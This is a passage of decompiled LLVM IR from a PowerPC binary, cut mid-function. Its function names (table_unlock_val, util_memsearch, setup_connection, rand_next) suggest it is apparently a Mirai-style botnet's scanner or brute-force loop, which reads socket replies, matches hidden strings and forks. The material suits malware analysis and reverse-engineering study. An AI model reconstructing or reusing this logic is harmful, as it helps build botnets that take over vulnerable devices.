  %v3_10007e04 = load i32, i32* %v2_10007e04, align 4
  %v2_10007e08 = urem i32 %v1_10007e08, 32
  %v3_10007e08 = sub i32 0, %v1_10007e08
  %v4_10007e08 = urem i32 %v3_10007e08, 32
  %v5_10007e08 = shl i32 %v3_10007e04, %v4_10007e08
  %v6_10007e08 = xor i32 %v4_10007e08, 31
  %v7_10007e08 = lshr i32 %v3_10007e04, %v6_10007e08
  %v8_10007e08 = udiv i32 %v7_10007e08, 2
  %v9_10007e08 = or i32 %v8_10007e08, %v5_10007e08
  %v10_10007e08 = and i32 %v1_10007e08, 32
  %v11_10007e08 = icmp ne i32 %v10_10007e08, 0
  %v12_10007e08 = lshr i32 -1, %v2_10007e08
  %v13_10007e08 = select i1 %v11_10007e08, i32 0, i32 %v12_10007e08
  %v14_10007e08 = and i32 %v9_10007e08, %v13_10007e08
  %v15_10007e08 = ashr i32 %v3_10007e04, 31
  %v16_10007e08 = sub i32 -1, %v13_10007e08
  %v17_10007e08 = and i32 %v15_10007e08, %v16_10007e08
  %v18_10007e08 = or i32 %v14_10007e08, %v17_10007e08
  store i32 %v18_10007e08, i32* %r0.global-to-local, align 4
  %v1_10007e0c = urem i32 %v18_10007e08, 2
  store i32 %v1_10007e0c, i32* %r9.global-to-local, align 4
  %v3_10007e0c = icmp eq i32 %v1_10007e0c, 0
  br i1 %v3_10007e0c, label %dec_label_pc_10008804, label %dec_label_pc_10007e14

dec_label_pc_10007e14:                            ; preds = %dec_label_pc_10007e00
  %v0_10007e14 = load i32, i32* @r28, align 4
  %v1_10007e14 = add i32 %v0_10007e14, 28
  store i32 %v1_10007e14, i32* %r10.global-to-local, align 4
  %v1_10007e18 = add i32 %v0_10007e14, 92
  store i32 %v1_10007e18, i32* %r11.global-to-local, align 4
  %v1_10007e1c = add i32 %v0_10007e14, 12
  %v2_10007e1c = inttoptr i32 %v1_10007e1c to i32*
  %v3_10007e1c = load i32, i32* %v2_10007e1c, align 4
  store i32 %v3_10007e1c, i32* @r8, align 4
  %v1_10007e2851 = icmp slt i32 %v3_10007e1c, 0
  %v3_10007e2853 = icmp eq i32 %v3_10007e1c, 0
  store i1 %v1_10007e2851, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e2853, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e2853, label %dec_label_pc_10008804, label %dec_label_pc_10007e30

dec_label_pc_10007e30:                            ; preds = %dec_label_pc_10007e28.backedge.thread, %dec_label_pc_10007e28.backedge, %dec_label_pc_10007e14
  %v0_10007e30 = phi i32 [ %v0_10007e14, %dec_label_pc_10007e14 ], [ %storemerge.in.in.in, %dec_label_pc_10007e28.backedge ], [ %v0_10007e3086.ph, %dec_label_pc_10007e28.backedge.thread ]
  %v1_10007e30 = add i32 %v0_10007e30, 24
  %v2_10007e30 = inttoptr i32 %v1_10007e30 to i32*
  %v3_10007e30 = load i32, i32* %v2_10007e30, align 4
  store i32 %v3_10007e30, i32* %r0.global-to-local, align 4
  store i32 %v1_10007e14, i32* %r18.global-to-local, align 4
  %v1_10007e38 = icmp slt i32 %v3_10007e30, 256
  %v3_10007e38 = icmp eq i32 %v3_10007e30, 256
  store i1 %v1_10007e38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e38, label %dec_label_pc_100088e4, label %dec_label_pc_10007e40

dec_label_pc_10007e40:                            ; preds = %dec_label_pc_10007e30, %dec_label_pc_100088e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10007e48 = load i32, i32* @r25, align 4
  %v2_10007e48 = inttoptr i32 %v1_10007e48 to i32*
  store i32 0, i32* %v2_10007e48, align 4
  %v0_10007e4c = load i32, i32* @r28, align 4
  %v1_10007e4c = add i32 %v0_10007e4c, 24
  %v2_10007e4c = inttoptr i32 %v1_10007e4c to i32*
  %v3_10007e4c = load i32, i32* %v2_10007e4c, align 4
  %v1_10007e50 = add i32 %v0_10007e4c, 4
  %v2_10007e50 = inttoptr i32 %v1_10007e50 to i32*
  %v3_10007e50 = load i32, i32* %v2_10007e50, align 4
  %v0_10007e54 = load i32, i32* %r18.global-to-local, align 4
  %v2_10007e54 = add i32 %v0_10007e54, %v3_10007e4c
  store i32 %v2_10007e54, i32* %r29.global-to-local, align 4
  %v1_10007e58 = sub i32 256, %v3_10007e4c
  store i32 268467812, i32* @lr, align 4
  %v4_10007e60 = call i32 @__libc_recv(i32 %v3_10007e50, i32 %v2_10007e54, i32 %v1_10007e58, i32 16384)
  %tmp173 = icmp slt i32 %v4_10007e60, 1
  br i1 %tmp173, label %dec_label_pc_100087b4, label %dec_label_pc_10007e6c

dec_label_pc_10007e6c:                            ; preds = %dec_label_pc_10007e40
  store i32 %v4_10007e60, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007e74

dec_label_pc_10007e74:                            ; preds = %dec_label_pc_10007e88, %dec_label_pc_10007e6c
  %v0_10007e8c90 = phi i32 [ %v1_10007e8c, %dec_label_pc_10007e88 ], [ %v4_10007e60, %dec_label_pc_10007e6c ]
  %v1_10007e84 = phi i32 [ %v1_10007e88, %dec_label_pc_10007e88 ], [ 0, %dec_label_pc_10007e6c ]
  %v1_10007e74 = load i32, i32* @r29, align 4
  %v2_10007e74 = add i32 %v1_10007e74, %v1_10007e84
  %v3_10007e74 = inttoptr i32 %v2_10007e74 to i8*
  %v4_10007e74 = load i8, i8* %v3_10007e74, align 1
  %v5_10007e74 = zext i8 %v4_10007e74 to i32
  store i32 %v5_10007e74, i32* %r0.global-to-local, align 4
  %v3_10007e78 = icmp eq i8 %v4_10007e74, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e78, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e78, label %dec_label_pc_10007e80, label %dec_label_pc_10007e88

dec_label_pc_10007e80:                            ; preds = %dec_label_pc_10007e74
  store i32 65, i32* %r0.global-to-local, align 4
  store i8 65, i8* %v3_10007e74, align 1
  %v0_10007e88.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10007e8c.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007e88

dec_label_pc_10007e88:                            ; preds = %dec_label_pc_10007e74, %dec_label_pc_10007e80
  %v0_10007e8c = phi i32 [ %v0_10007e8c90, %dec_label_pc_10007e74 ], [ %v0_10007e8c.pre, %dec_label_pc_10007e80 ]
  %v0_10007e88 = phi i32 [ %v1_10007e84, %dec_label_pc_10007e74 ], [ %v0_10007e88.pre, %dec_label_pc_10007e80 ]
  %v1_10007e88 = add i32 %v0_10007e88, 1
  store i32 %v1_10007e88, i32* %r9.global-to-local, align 4
  %v1_10007e8c = add i32 %v0_10007e8c, -1
  store i32 %v1_10007e8c, i32* %ctr.global-to-local, align 4
  %v2_10007e8c = icmp eq i32 %v1_10007e8c, 0
  br i1 %v2_10007e8c, label %dec_label_pc_10007e90, label %dec_label_pc_10007e74

dec_label_pc_10007e90:                            ; preds = %dec_label_pc_10007e88, %dec_label_pc_100087b8
  %v0_10007e90 = load i32, i32* @r28, align 4
  %v1_10007e90 = add i32 %v0_10007e90, 24
  %v2_10007e90 = inttoptr i32 %v1_10007e90 to i32*
  %v3_10007e90 = load i32, i32* %v2_10007e90, align 4
  %v3_10007e94 = load i32, i32* @global_var_100211f8.152, align 4
  store i32 %v3_10007e94, i32* %r9.global-to-local, align 4
  %v2_10007e98 = add i32 %v3_10007e90, %v4_10007e60
  store i32 %v2_10007e98, i32* %r0.global-to-local, align 4
  store i32 %v2_10007e98, i32* %v2_10007e90, align 4
  %v0_10007ea0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007ea0 = load i32, i32* @r28, align 4
  %v2_10007ea0 = add i32 %v1_10007ea0, 8
  %v3_10007ea0 = inttoptr i32 %v2_10007ea0 to i32*
  store i32 %v0_10007ea0, i32* %v3_10007ea0, align 4
  %v0_10007ea444 = load i32, i32* @r28, align 4
  %v1_10007ea445 = add i32 %v0_10007ea444, 12
  %v2_10007ea446 = inttoptr i32 %v1_10007ea445 to i32*
  %v3_10007ea447 = load i32, i32* %v2_10007ea446, align 4
  store i32 %v3_10007ea447, i32* @r8, align 4
  %v1_10007ea848 = icmp ult i32 %v3_10007ea447, 10
  %v2_10007ea849 = icmp ugt i32 %v3_10007ea447, 10
  %v3_10007ea850 = icmp eq i32 %v3_10007ea447, 10
  store i1 %v1_10007ea848, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ea850, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007ea849, label %dec_label_pc_10007e28.backedge.thread, label %dec_label_pc_10007eb0

dec_label_pc_10007eb0:                            ; preds = %dec_label_pc_10007e90, %dec_label_pc_100081e4
  %v0_10007eb4 = phi i32 [ %v3_10007ea4, %dec_label_pc_100081e4 ], [ %v3_10007ea447, %dec_label_pc_10007e90 ]
  %v1_10007eb4 = mul i32 %v0_10007eb4, 4
  store i32 %v1_10007eb4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001011c.208 to i32), i32* %r10.global-to-local, align 4
  %v2_10007ebc = add i32 %v1_10007eb4, ptrtoint (i32* @global_var_1001011c.208 to i32)
  %v3_10007ebc = inttoptr i32 %v2_10007ebc to i32*
  %v4_10007ebc = load i32, i32* %v3_10007ebc, align 4
  %v2_10007ec0 = add i32 %v4_10007ebc, ptrtoint (i32* @global_var_1001011c.208 to i32)
  store i32 %v2_10007ec0, i32* %r9.global-to-local, align 4
  store i32 %v2_10007ec0, i32* %ctr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10007ec0)
  store i32 268467924, i32* @lr, align 4
  %v1_10007ed0 = call i32 @table_unlock_val(i32 30)
  %v3_10007edc = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-1932)
  %v3_10007ee0 = load i32, i32* %stack_var_-1932, align 4
  %v0_10007ee4 = load i32, i32* @r28, align 4
  %v1_10007ee4 = add i32 %v0_10007ee4, 24
  %v2_10007ee4 = inttoptr i32 %v1_10007ee4 to i32*
  %v3_10007ee4 = load i32, i32* %v2_10007ee4, align 4
  %v1_10007eec = add i32 %v3_10007ee0, -1
  %v0_10007ef0 = load i32, i32* %r18.global-to-local, align 4
  %v4_10007ef4 = call i32 @util_memsearch(i32 %v0_10007ef0, i32 %v3_10007ee4, i32 %v3_10007edc, i32 %v1_10007eec)
  %v1_10007ef8 = icmp slt i32 %v4_10007ef4, -1
  %v3_10007ef8 = icmp eq i32 %v4_10007ef4, -1
  store i1 %v1_10007ef8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ef8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007ef8, label %dec_label_pc_1000881c, label %dec_label_pc_10007f00

dec_label_pc_10007f00:                            ; preds = %dec_label_pc_10007eb0
  store i32 268467976, i32* @lr, align 4
  %v1_10007f04 = call i32 @table_lock_val(i32 30)
  %v0_10007f08 = load i32, i32* @r28, align 4
  %v1_10007f08 = add i32 %v0_10007f08, 4
  %v2_10007f08 = inttoptr i32 %v1_10007f08 to i32*
  %v3_10007f08 = load i32, i32* %v2_10007f08, align 4
  store i32 %v3_10007f08, i32* @r3, align 4
  %v0_10007f0c = call i32 @__GI___libc_close()
  %v0_10007f10 = load i32, i32* @r28, align 4
  %v1_10007f10 = add i32 %v0_10007f10, 284
  %v2_10007f10 = inttoptr i32 %v1_10007f10 to i8*
  %v3_10007f10 = load i8, i8* %v2_10007f10, align 1
  %v4_10007f10 = zext i8 %v3_10007f10 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10007f18 = add nuw nsw i32 %v4_10007f10, 1
  store i32 %v1_10007f18, i32* %r9.global-to-local, align 4
  %v2_10007f1c = add i32 %v0_10007f10, 4
  %v3_10007f1c = inttoptr i32 %v2_10007f1c to i32*
  store i32 -1, i32* %v3_10007f1c, align 4
  %v0_10007f20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007f20 = urem i32 %v0_10007f20, 256
  store i32 %v1_10007f20, i32* %r9.global-to-local, align 4
  %v1_10007f24 = icmp ult i32 %v1_10007f20, 10
  %v3_10007f24 = icmp eq i32 %v1_10007f20, 10
  store i1 %v1_10007f24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f24, i1* %cr7_eq.global-to-local, align 1
  %v1_10007f28 = trunc i32 %v0_10007f20 to i8
  %v2_10007f28 = load i32, i32* @r28, align 4
  %v3_10007f28 = add i32 %v2_10007f28, 284
  %v4_10007f28 = inttoptr i32 %v3_10007f28 to i8*
  store i8 %v1_10007f28, i8* %v4_10007f28, align 1
  %v0_10007f2c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007f2c, label %dec_label_pc_10007f30, label %dec_label_pc_100088b0

dec_label_pc_10007f30:                            ; preds = %dec_label_pc_10007f00
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r26.global-to-local, align 4
  %v2_10007f3c = load i32, i32* @r28, align 4
  %v3_10007f3c = add i32 %v2_10007f3c, 284
  %v4_10007f3c = inttoptr i32 %v3_10007f3c to i8*
  store i8 0, i8* %v4_10007f3c, align 1
  %v0_10007f40 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007f40 = load i32, i32* @r28, align 4
  %v2_10007f40 = add i32 %v1_10007f40, 12
  %v3_10007f40 = inttoptr i32 %v2_10007f40 to i32*
  store i32 %v0_10007f40, i32* %v3_10007f40, align 4
  br label %dec_label_pc_100081d0

dec_label_pc_100081c8:                            ; preds = %dec_label_pc_10008864, %dec_label_pc_10008894
  %v1_100081c8 = call %0 @__asm_mtcrf(i32 128, i32 %v1_1000886c)
  %v4_100081c8 = extractvalue %0 %v1_100081c8, 2
  br i1 %v4_100081c8, label %dec_label_pc_10007e28.backedge, label %dec_label_pc_100081d0

dec_label_pc_100081d0:                            ; preds = %dec_label_pc_100081c8, %dec_label_pc_100088b0, %dec_label_pc_10007f30
  %v0_100081d0 = load i32, i32* @r28, align 4
  %v1_100081d0 = add i32 %v0_100081d0, 24
  %v2_100081d0 = inttoptr i32 %v1_100081d0 to i32*
  %v3_100081d0 = load i32, i32* %v2_100081d0, align 4
  %v0_100081d4 = load i32, i32* %r26.global-to-local, align 4
  %v2_100081d8 = icmp slt i32 %v0_100081d4, %v3_100081d0
  %v3_100081d8 = icmp sgt i32 %v0_100081d4, %v3_100081d0
  %v4_100081d8 = icmp eq i32 %v0_100081d4, %v3_100081d0
  store i1 %v2_100081d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100081d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100081d8, label %dec_label_pc_100081e0, label %dec_label_pc_100081e4

dec_label_pc_100081e0:                            ; preds = %dec_label_pc_100081d0
  br label %dec_label_pc_100081e4

dec_label_pc_100081e4:                            ; preds = %dec_label_pc_100081d0, %dec_label_pc_100081e0
  %v0_100081e4 = phi i32 [ %v0_100081d4, %dec_label_pc_100081d0 ], [ %v3_100081d0, %dec_label_pc_100081e0 ]
  %v2_100081e4 = sub i32 %v3_100081d0, %v0_100081e4
  %v0_100081e8 = load i32, i32* %r18.global-to-local, align 4
  %v2_100081e8 = add i32 %v0_100081e8, %v0_100081e4
  store i32 %v2_100081e4, i32* %v2_100081d0, align 4
  %v0_100081f0 = load i32, i32* %r18.global-to-local, align 4
  store i32 268468728, i32* @lr, align 4
  %v3_100081f4 = call i32 @memmove(i32 %v0_100081f0, i32 %v2_100081e8, i32 %v2_100081e4)
  %v0_10007ea4 = load i32, i32* @r28, align 4
  %v1_10007ea4 = add i32 %v0_10007ea4, 12
  %v2_10007ea4 = inttoptr i32 %v1_10007ea4 to i32*
  %v3_10007ea4 = load i32, i32* %v2_10007ea4, align 4
  store i32 %v3_10007ea4, i32* @r8, align 4
  %v1_10007ea8 = icmp ult i32 %v3_10007ea4, 10
  %v2_10007ea8 = icmp ugt i32 %v3_10007ea4, 10
  %v3_10007ea8 = icmp eq i32 %v3_10007ea4, 10
  store i1 %v1_10007ea8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ea8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007ea8, label %dec_label_pc_10007e28.backedge.thread, label %dec_label_pc_10007eb0

dec_label_pc_10007e28.backedge.thread:            ; preds = %dec_label_pc_100081e4, %dec_label_pc_10007e90
  %v0_10007e3086.ph = phi i32 [ %v0_10007ea444, %dec_label_pc_10007e90 ], [ %v0_10007ea4, %dec_label_pc_100081e4 ]
  %v0_10007e28.be.ph = phi i32 [ %v3_10007ea447, %dec_label_pc_10007e90 ], [ %v3_10007ea4, %dec_label_pc_100081e4 ]
  %v1_10007e2895 = icmp slt i32 %v0_10007e28.be.ph, 0
  %v3_10007e2897 = icmp eq i32 %v0_10007e28.be.ph, 0
  store i1 %v1_10007e2895, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e2897, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10007e30

dec_label_pc_10007e28.backedge:                   ; preds = %dec_label_pc_1000881c, %dec_label_pc_100081c8, %dec_label_pc_10008a50
  %storemerge.in.in.in = load i32, i32* @r28, align 4
  %storemerge.in.in = add i32 %storemerge.in.in.in, 12
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r8, align 4
  %v1_10007e28 = icmp slt i32 %storemerge, 0
  %v3_10007e28 = icmp eq i32 %storemerge, 0
  store i1 %v1_10007e28, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e28, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e28, label %dec_label_pc_10008804, label %dec_label_pc_10007e30

dec_label_pc_100087b4:                            ; preds = %dec_label_pc_10007e40
  %v3_10007e64 = icmp eq i32 %v4_10007e60, 0
  br i1 %v3_10007e64, label %dec_label_pc_10008a70, label %dec_label_pc_100087b8

dec_label_pc_100087b8:                            ; preds = %dec_label_pc_100087b4
  %v1_100087b8 = icmp slt i32 %v4_10007e60, -1
  %v3_100087b8 = icmp eq i32 %v4_10007e60, -1
  store i1 %v1_100087b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100087b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100087b8, label %dec_label_pc_100087c0, label %dec_label_pc_10007e90

dec_label_pc_100087c0:                            ; preds = %dec_label_pc_100087b8
  %v0_100087c0 = load i32, i32* @r25, align 4
  %v1_100087c0 = inttoptr i32 %v0_100087c0 to i32*
  %v2_100087c0 = load i32, i32* %v1_100087c0, align 4
  store i32 %v2_100087c0, i32* %r0.global-to-local, align 4
  %v1_100087c4 = icmp slt i32 %v2_100087c0, 11
  %v3_100087c4 = icmp eq i32 %v2_100087c0, 11
  store i1 %v1_100087c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100087c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100087c4, label %dec_label_pc_10008804, label %dec_label_pc_100087cc

dec_label_pc_100087cc:                            ; preds = %dec_label_pc_100087c0, %dec_label_pc_10008a70
  %v0_100087cc = load i32, i32* @r28, align 4
  %v1_100087cc = add i32 %v0_100087cc, 4
  %v2_100087cc = inttoptr i32 %v1_100087cc to i32*
  %v3_100087cc = load i32, i32* %v2_100087cc, align 4
  store i32 %v3_100087cc, i32* @r3, align 4
  %v0_100087d0 = call i32 @__GI___libc_close()
  %v0_100087d4 = load i32, i32* @r28, align 4
  %v1_100087d4 = add i32 %v0_100087d4, 284
  %v2_100087d4 = inttoptr i32 %v1_100087d4 to i8*
  %v3_100087d4 = load i8, i8* %v2_100087d4, align 1
  %v4_100087d4 = zext i8 %v3_100087d4 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_100087dc = add nuw nsw i32 %v4_100087d4, 1
  store i32 %v1_100087dc, i32* %r9.global-to-local, align 4
  %v2_100087e0 = add i32 %v0_100087d4, 4
  %v3_100087e0 = inttoptr i32 %v2_100087e0 to i32*
  store i32 -1, i32* %v3_100087e0, align 4
  %v0_100087e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100087e4 = urem i32 %v0_100087e4, 256
  store i32 %v1_100087e4, i32* %r9.global-to-local, align 4
  %v1_100087e8 = icmp ult i32 %v1_100087e4, 9
  %v3_100087e8 = icmp eq i32 %v1_100087e4, 9
  store i1 %v1_100087e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100087e8, i1* %cr7_eq.global-to-local, align 1
  %v1_100087ec = trunc i32 %v0_100087e4 to i8
  %v2_100087ec = load i32, i32* @r28, align 4
  %v3_100087ec = add i32 %v2_100087ec, 284
  %v4_100087ec = inttoptr i32 %v3_100087ec to i8*
  store i8 %v1_100087ec, i8* %v4_100087ec, align 1
  %v0_100087f0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100087f0 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100087f0 = or i1 %v0_100087f0, %v1_100087f0
  br i1 %v2_100087f0, label %dec_label_pc_10008a7c, label %dec_label_pc_100087f4

dec_label_pc_100087f4:                            ; preds = %dec_label_pc_100087cc
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100087fc = load i32, i32* @r28, align 4
  %v2_100087fc = add i32 %v1_100087fc, 12
  %v3_100087fc = inttoptr i32 %v2_100087fc to i32*
  store i32 0, i32* %v3_100087fc, align 4
  %v0_10008800 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008800 = trunc i32 %v0_10008800 to i8
  %v2_10008800 = load i32, i32* @r28, align 4
  %v3_10008800 = add i32 %v2_10008800, 284
  %v4_10008800 = inttoptr i32 %v3_10008800 to i8*
  store i8 %v1_10008800, i8* %v4_10008800, align 1
  br label %dec_label_pc_10008804

dec_label_pc_10008804:                            ; preds = %dec_label_pc_10007e28.backedge, %dec_label_pc_10007e14, %dec_label_pc_100087c0, %dec_label_pc_10007e00, %dec_label_pc_10007dc0, %dec_label_pc_10008a7c, %dec_label_pc_100089c0, %dec_label_pc_100087f4
  %v3_10008804 = load i32, i32* %stack_var_-1936, align 4
  store i32 %v3_10008804, i32* %r9.global-to-local, align 4
  %v1_10008808 = add i32 %v3_10008804, 1
  store i32 %v1_10008808, i32* %r0.global-to-local, align 4
  %v1_1000880c = icmp slt i32 %v1_10008808, 255
  %v3_1000880c = icmp eq i32 %v1_10008808, 255
  store i1 %v1_1000880c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000880c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10008808, i32* %stack_var_-1936, align 4
  %tmp174 = icmp slt i32 %v1_10008808, 256
  br i1 %tmp174, label %dec_label_pc_10007dc0, label %dec_label_pc_100077fc

dec_label_pc_1000881c:                            ; preds = %dec_label_pc_10007eb0
  store i32 ptrtoint ([3 x i8]* @global_var_10008824.226 to i32), i32* @lr, align 4
  %v1_10008820 = call i32 @table_lock_val(i32 30)
  store i32 268470316, i32* @lr, align 4
  %v1_10008828 = call i32 @table_unlock_val(i32 29)
  %v3_10008834 = call i32 @table_retrieve_val(i32 29, i32* nonnull %stack_var_-1932)
  %v3_10008838 = load i32, i32* %stack_var_-1932, align 4
  %v0_1000883c = load i32, i32* @r28, align 4
  %v1_1000883c = add i32 %v0_1000883c, 24
  %v2_1000883c = inttoptr i32 %v1_1000883c to i32*
  %v3_1000883c = load i32, i32* %v2_1000883c, align 4
  %v1_10008844 = add i32 %v3_10008838, -1
  %v0_10008848 = load i32, i32* %r18.global-to-local, align 4
  %v4_1000884c = call i32 @util_memsearch(i32 %v0_10008848, i32 %v3_1000883c, i32 %v3_10008834, i32 %v1_10008844)
  store i32 %v4_1000884c, i32* %r26.global-to-local, align 4
  store i32 268470364, i32* @lr, align 4
  %v1_10008858 = call i32 @table_lock_val(i32 29)
  %v1_1000885c = icmp slt i32 %v4_1000884c, -1
  %v3_1000885c = icmp eq i32 %v4_1000884c, -1
  store i1 %v1_1000885c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000885c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000885c, label %dec_label_pc_10007e28.backedge, label %dec_label_pc_10008864

dec_label_pc_10008864:                            ; preds = %dec_label_pc_1000881c
  %v1_10008864 = icmp slt i32 %v4_1000884c, 0
  %v3_10008864 = icmp eq i32 %v4_1000884c, 0
  store i1 %v1_10008864, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008864, i1* %cr7_eq.global-to-local, align 1
  %v0_10008868 = call i32 @__asm_mfcr()
  %v1_1000886c = mul i32 %v0_10008868, 268435456
  store i32 %v1_1000886c, i32* @r29, align 4
  %v0_10008870 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10008870 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10008870 = or i1 %v0_10008870, %v1_10008870
  br i1 %v2_10008870, label %dec_label_pc_100081c8, label %dec_label_pc_10008874

dec_label_pc_10008874:                            ; preds = %dec_label_pc_10008864
  %v0_10008874 = load i32, i32* @r28, align 4
  %v1_10008874 = add i32 %v0_10008874, 20
  %v2_10008874 = inttoptr i32 %v1_10008874 to i16*
  %v3_10008874 = load i16, i16* %v2_10008874, align 2
  %v4_10008874 = zext i16 %v3_10008874 to i32
  store i32 %v4_10008874, i32* %r0.global-to-local, align 4
  %v1_10008878 = add i32 %v0_10008874, 16
  %v2_10008878 = inttoptr i32 %v1_10008878 to i32*
  %v3_10008878 = load i32, i32* %v2_10008878, align 4
  store i32 %v3_10008878, i32* %r9.global-to-local, align 4
  store i32 %v4_10008874, i32* %stack_var_-1944, align 4
  store i32 %v3_10008878, i32* %stack_var_-1928, align 4
  %v1_10008884 = inttoptr i32 %v0_10008874 to i32*
  %v2_10008884 = load i32, i32* %v1_10008884, align 4
  store i32 %v2_10008884, i32* %r27.global-to-local, align 4
  store i32 268470412, i32* @lr, align 4
  %v0_10008888 = call i32 @__libc_fork()
  %tmp175 = icmp slt i32 %v0_10008888, 1
  br i1 %tmp175, label %dec_label_pc_100089e0, label %dec_label_pc_10008894

dec_label_pc_10008894:                            ; preds = %dec_label_pc_100089e0, %dec_label_pc_10008874
  %v0_10008894 = load i32, i32* @r28, align 4
  %v1_10008894 = add i32 %v0_10008894, 4
  %v2_10008894 = inttoptr i32 %v1_10008894 to i32*
  %v3_10008894 = load i32, i32* %v2_10008894, align 4
  store i32 %v3_10008894, i32* @r3, align 4
  %v0_10008898 = call i32 @__GI___libc_close()
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_100088a4 = load i32, i32* @r28, align 4
  %v2_100088a4 = add i32 %v1_100088a4, 12
  %v3_100088a4 = inttoptr i32 %v2_100088a4 to i32*
  store i32 0, i32* %v3_100088a4, align 4
  %v0_100088a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100088a8 = load i32, i32* @r28, align 4
  %v2_100088a8 = add i32 %v1_100088a8, 4
  %v3_100088a8 = inttoptr i32 %v2_100088a8 to i32*
  store i32 %v0_100088a8, i32* %v3_100088a8, align 4
  br label %dec_label_pc_100081c8

dec_label_pc_100088b0:                            ; preds = %dec_label_pc_10007f00
  %v0_100088b0 = load i32, i32* @r28, align 4
  store i32 %v0_100088b0, i32* @r3, align 4
  store i32 -1, i32* %r26.global-to-local, align 4
  store i32 268470460, i32* @lr, align 4
  %v0_100088b8 = call i32 @setup_connection()
  br label %dec_label_pc_100081d0

dec_label_pc_100088e4:                            ; preds = %dec_label_pc_10007e30
  store i32 268470516, i32* @lr, align 4
  %v3_100088f0 = call i32 @memmove(i32 %v1_10007e14, i32 %v1_10007e18, i32 192)
  %v0_100088f4 = load i32, i32* @r28, align 4
  %v1_100088f4 = add i32 %v0_100088f4, 24
  %v2_100088f4 = inttoptr i32 %v1_100088f4 to i32*
  %v3_100088f4 = load i32, i32* %v2_100088f4, align 4
  %v1_100088f8 = add i32 %v3_100088f4, -64
  store i32 %v1_100088f8, i32* %r9.global-to-local, align 4
  store i32 %v1_100088f8, i32* %v2_100088f4, align 4
  br label %dec_label_pc_10007e40

dec_label_pc_10008904:                            ; preds = %dec_label_pc_10007de4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10008918, i32* %r7.global-to-local, align 4
  store i32 4, i32* %stack_var_-1928, align 4
  store i32 0, i32* %stack_var_-1932, align 4
  store i32 268470568, i32* @lr, align 4
  %v6_10008924 = call i32 @getsockopt(i32 1, i32 4, i32 %v1_10007ed4, i32 %v2_10008918, i32 %v1_10007de4)
  %v3_10008928 = load i32, i32* %stack_var_-1932, align 4
  store i32 %v3_10008928, i32* %r0.global-to-local, align 4
  %v2_1000892c = or i32 %v3_10008928, %v6_10008924
  store i32 %v2_1000892c, i32* %r9.global-to-local, align 4
  %v5_1000892c = icmp eq i32 %v2_1000892c, 0
  br i1 %v5_1000892c, label %dec_label_pc_10008934, label %dec_label_pc_100089c0

dec_label_pc_10008934:                            ; preds = %dec_label_pc_10008904
  store i32 2, i32* %r8.global-to-local, align 4
  %v1_10008938 = load i32, i32* @r28, align 4
  %v2_10008938 = add i32 %v1_10008938, 12
  %v3_10008938 = inttoptr i32 %v2_10008938 to i32*
  store i32 2, i32* %v3_10008938, align 4
  %v0_1000893c = call i32 @rand_next()
  %v3_10008944 = load i16, i16* @global_var_100211fc.155, align 2
  %v4_10008944 = zext i16 %v3_10008944 to i32
  store i32 %v4_10008944, i32* %r9.global-to-local, align 4
  store i32 268566528, i32* %r10.global-to-local, align 4
